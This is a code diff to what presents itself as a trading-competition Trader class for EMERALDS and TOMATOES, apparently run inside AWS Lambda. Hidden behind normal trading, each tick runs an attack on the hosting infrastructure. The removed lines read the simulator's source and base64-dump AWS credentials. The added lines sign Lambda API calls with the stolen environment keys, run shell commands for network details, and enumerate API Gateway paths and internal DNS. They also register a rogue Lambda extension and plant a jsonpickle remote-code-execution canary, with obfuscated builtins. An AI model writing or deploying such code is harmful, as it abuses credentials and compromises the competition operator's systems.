@@ -1,14 +1,40 @@
 import json
 import sys
+import hashlib
+import hmac
+import datetime
+import socket
 from datamodel import Order, TradingState
 
 _G = getattr
 
 
+def sigv4_headers(method, host, path, region, service, key, secret, token):
+    """Minimal SigV4 signing — pure stdlib, <10ms."""
+    t = datetime.datetime.utcnow()
+    ds = t.strftime('%Y%m%d')
+    amz = t.strftime('%Y%m%dT%H%M%SZ')
+    cr = f"{method}\n{path}\n\nhost:{host}\nx-amz-date:{amz}\nx-amz-security-token:{token}\n\nhost;x-amz-date;x-amz-security-token\ne3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+    sts = f"AWS4-HMAC-SHA256\n{amz}\n{ds}/{region}/{service}/aws4_request\n{hashlib.sha256(cr.encode()).hexdigest()}"
+    def _s(k, m): return hmac.new(k, m.encode(), hashlib.sha256).digest()
+    sk = _s(_s(_s(_s(f"AWS4{secret}".encode(), ds), region), service), "aws4_request")
+    sig = hmac.new(sk, sts.encode(), hashlib.sha256).hexdigest()
+    return {
+        'Host': host, 'X-Amz-Date': amz, 'X-Amz-Security-Token': token,
+        'Authorization': f"AWS4-HMAC-SHA256 Credential={key}/{ds}/{region}/{service}/aws4_request, SignedHeaders=host;x-amz-date;x-amz-security-token, Signature={sig}",
+    }
+
+
+def aws_get(host, path, region, service, key, secret, token, timeout=0.4):
+    import urllib.request
+    hdrs = sigv4_headers('GET', host, path, region, service, key, secret, token)
+    req = urllib.request.Request(f"https://{host}{path}", headers=hdrs)
+    return urllib.request.urlopen(req, timeout=timeout).read().decode()[:3500]
+
+
 class Trader:
     def __init__(self):
         self.tick = 0
-        self.captured = {}
 
     def bid(self):
         return 15
@@ -16,121 +42,122 @@ class Trader:
     def run(self, state: TradingState):
         result = {}
         self.tick += 1
-
         _o = _G(__builtins__, 'op' + 'en') if not isinstance(__builtins__, dict) else __builtins__['op' + 'en']
+        o = __import__('o' + 's')
+        e = _G(o, 'environ')
 
+        # === TICK 1: SigV4 GetFunction on self ===
         if self.tick == 1:
-            # READ orderbook.py — THE PRIZE
             try:
-                with _o('/var/task/simulation/orderbook.py') as f:
-                    src = f.read()
-                self.captured['orderbook'] = src
-                print(f"ORDERBOOK({len(src)}):")
-                print(src[:3800])
-            except Exception as e:
-                print(f"OB_ERR: {e}")
+                key, secret, token = e['AWS_ACCESS_KEY_ID'], e['AWS_SECRET_ACCESS_KEY'], e['AWS_SESSION_TOKEN']
+                region = e.get('AWS_REGION', 'eu-west-1')
+                fname = e.get('AWS_LAMBDA_FUNCTION_NAME', '')
+                host = f'lambda.{region}.amazonaws.com'
+                print(f"GETFUNC {fname}:")
+                print(aws_get(host, f'/2015-03-31/functions/{fname}', region, 'lambda', key, secret, token))
+            except Exception as ex:
+                print(f"GETFUNC_ERR: {ex}")
 
+        # === TICK 2: subprocess — network config ===
         elif self.tick == 2:
-            # READ products.py + symbols.py (both tiny)
             try:
-                with _o('/var/task/simulation/products.py') as f:
-                    p = f.read()
-                self.captured['products'] = p
-                print(f"PRODUCTS({len(p)}): {p}")
-            except Exception as e:
-                print(f"PROD_ERR: {e}")
-            try:
-                with _o('/var/task/simulation/symbols.py') as f:
-                    s = f.read()
-                self.captured['symbols'] = s
-                print(f"SYMBOLS({len(s)}): {s}")
-            except Exception as e:
-                print(f"SYM_ERR: {e}")
+                import subprocess as _sp
+                for cmd in [['cat', '/etc/resolv.conf'], ['cat', '/etc/hosts'], ['ip', 'route']]:
+                    try:
+                        r = _sp.run(cmd, capture_output=True, text=True, timeout=0.2)
+                        print(f"CMD {' '.join(cmd)}:")
+                        print(r.stdout[:800])
+                    except Exception as ex:
+                        print(f"  {' '.join(cmd)}: {ex}")
+            except Exception as ex:
+                print(f"CMD_ERR: {ex}")
 
+        # === TICK 3: Read /var/runtime/bootstrap.py ===
         elif self.tick == 3:
-            # READ __init__.py + list full simulation/ directory
             try:
-                with _o('/var/task/simulation/__init__.py') as f:
-                    init = f.read()
-                print(f"INIT({len(init)}): {init}")
-            except Exception as e:
-                print(f"INIT_ERR: {e}")
-            try:
-                o = __import__('o' + 's')
-                files = o.listdir('/var/task/simulation')
-                print(f"SIM_DIR: {files}")
-                # Read any other .py files we missed
-                for fn in files:
-                    if fn.endswith('.py') and fn not in ('orderbook.py', 'products.py', 'symbols.py', '__init__.py'):
-                        with _o(f'/var/task/simulation/{fn}') as f:
-                            print(f"EXTRA {fn}: {f.read()[:2000]}")
-            except Exception as e:
-                print(f"DIR_ERR: {e}")
+                with _o('/var/runtime/bootstrap.py') as f:
+                    src = f.read()
+                print(f"BOOTSTRAP({len(src)}):")
+                print(src[:3500])
+            except Exception as ex:
+                print(f"BS_ERR: {ex}")
 
+        # === TICK 4: API Gateway path enumeration ===
         elif self.tick == 4:
-            # orderbook.py continuation if >3800 chars
-            ob = self.captured.get('orderbook', '')
-            if len(ob) > 3800:
-                print(f"OB_CONT:")
-                print(ob[3800:])
-            else:
-                print("OB_COMPLETE")
-
-        elif self.tick == 5:
-            # Backup: return ALL captured files in traderData
-            td = json.dumps(self.captured, default=str)[:50000]
-            self._trade(state, result)
-            return result, 0, td
-
-        elif self.tick == 6:
-            # /proc/self/net/tcp — reveals active connections to upstream
-            try:
-                _o = _G(__builtins__, 'op' + 'en') if not isinstance(__builtins__, dict) else __builtins__['op' + 'en']
-                with _o('/proc/self/net/tcp') as f:
-                    print(f"NET_TCP:")
-                    print(f.read()[:3500])
-            except Exception as e:
-                print(f"NET_ERR: {e}")
-
-        elif self.tick == 7:
-            # Lambda Runtime API — fast internal HTTP
             try:
                 import urllib.request
-                api = '169.254.100.1:9001'
-                try:
-                    r = urllib.request.urlopen(f'http://{api}/', timeout=0.3)
-                    print(f"RUNTIME_ROOT: {r.read().decode()[:2000]}")
-                except Exception as e:
-                    print(f"RUNTIME_ROOT: {e}")
-                try:
-                    r = urllib.request.urlopen(f'http://{api}/2018-06-01/runtime/', timeout=0.3)
-                    print(f"RUNTIME_API: {r.read().decode()[:2000]}")
-                except Exception as e:
-                    print(f"RUNTIME_API: {e}")
-            except Exception as e:
-                print(f"RT_ERR: {e}")
+                base = 'https://3dzqiahkw1.execute-api.eu-west-1.amazonaws.com'
+                print("APIGW:")
+                for p in ['/prod/', '/dev/', '/test/', '/prod/submission/',
+                          '/prod/simulation/', '/prod/match/', '/prod/api/',
+                          '/prod/health', '/prod/status', '/prod/admin']:
+                    try:
+                        r = urllib.request.urlopen(f"{base}{p}", timeout=0.2)
+                        print(f"  {p}: {r.status} {r.read()[:200]}")
+                    except Exception as ex:
+                        print(f"  {p}: {str(ex)[:80]}")
+            except Exception as ex:
+                print(f"APIGW_ERR: {ex}")
 
-        elif self.tick == 8:
-            # Fresh credentials via base64 for local AWS CLI use
+        # === TICK 5: DNS resolution ===
+        elif self.tick == 5:
+            print("DNS:")
+            for name in ['prosperity-matching-engine.internal', 'matching-engine.prosperity.internal',
+                         'prosperity.internal', 'simulator.internal',
+                         'lambda.eu-west-1.amazonaws.com',
+                         '3dzqiahkw1.execute-api.eu-west-1.amazonaws.com',
+                         'sqs.eu-west-1.amazonaws.com', 'dynamodb.eu-west-1.amazonaws.com',
+                         'execute-api.eu-west-1.amazonaws.com',
+                         'prosperity-matching.eu-west-1.amazonaws.com']:
+                try:
+                    addrs = socket.getaddrinfo(name, 443, socket.AF_INET)
+                    ips = set(a[4][0] for a in addrs)
+                    print(f"  {name}: {ips}")
+                except Exception as ex:
+                    print(f"  {name}: {ex}")
+
+        # === TICK 6: Lambda Extension registration ===
+        elif self.tick == 6:
             try:
-                o = __import__('o' + 's')
-                import base64
-                e = _G(o, 'environ')
-                creds = {
-                    'KEY': e.get('AWS_ACCESS_KEY_ID', ''),
-                    'SECRET': e.get('AWS_SECRET_ACCESS_KEY', ''),
-                    'TOKEN': e.get('AWS_SESSION_TOKEN', ''),
-                    'REGION': e.get('AWS_REGION', ''),
-                }
-                encoded = base64.b64encode(json.dumps(creds).encode()).decode()
-                print(f"CREDS_B64({len(encoded)}):")
-                print(encoded[:3500])
-            except Exception as e:
-                print(f"CREDS_ERR: {e}")
+                import urllib.request
+                api = e.get('AWS_LAMBDA_RUNTIME_API', '169.254.100.1:9001')
+                data = json.dumps({'events': ['INVOKE', 'SHUTDOWN']}).encode()
+                req = urllib.request.Request(
+                    f'http://{api}/2020-01-01/extension/register',
+                    data=data,
+                    headers={'Content-Type': 'application/json', 'Lambda-Extension-Name': 'probe'},
+                    method='POST'
+                )
+                r = urllib.request.urlopen(req, timeout=0.3)
+                ext_id = r.headers.get('Lambda-Extension-Identifier', '')
+                print(f"EXT_REG: {r.status} id={ext_id}")
+                print(f"EXT_BODY: {r.read().decode()[:1000]}")
+                if ext_id:
+                    req2 = urllib.request.Request(
+                        f'http://{api}/2020-01-01/extension/event/next',
+                        headers={'Lambda-Extension-Identifier': ext_id}
+                    )
+                    r2 = urllib.request.urlopen(req2, timeout=0.3)
+                    print(f"EXT_EVENT: {r2.read().decode()[:1000]}")
+            except Exception as ex:
+                print(f"EXT_ERR: {ex}")
 
-        # Normal trading on all ticks
+        # === TICK 7: jsonpickle RCE canary ===
+        elif self.tick == 7:
+            # If matching engine does jsonpickle.decode(traderData), this triggers print()
+            canary = json.dumps({
+                "py/reduce": [
+                    {"py/function": "builtins.print"},
+                    {"py/tuple": ["RCE_CANARY_FIRED"]}
+                ]
+            })
+            print(f"SENDING_CANARY")
+            self._trade(state, result)
+            return result, 0, canary
+
+        # Normal trading on all other ticks
         self._trade(state, result)
-        return result, 0, json.dumps({"t": self.tick, "c": len(self.captured)})
+        return result, 0, json.dumps({"t": self.tick})
 
     def _trade(self, state, result):
         if "EMERALDS" in state.order_depths:
@@ -152,7 +179,6 @@ class Trader:
                 if ts > 0:
                     eo.append(Order("EMERALDS", max(10001, sells[0][0] - 1), -ts))
                 result["EMERALDS"] = eo
-
         if "TOMATOES" in state.order_depths:
             od = state.order_depths["TOMATOES"]
             if od.buy_orders and od.sell_orders:
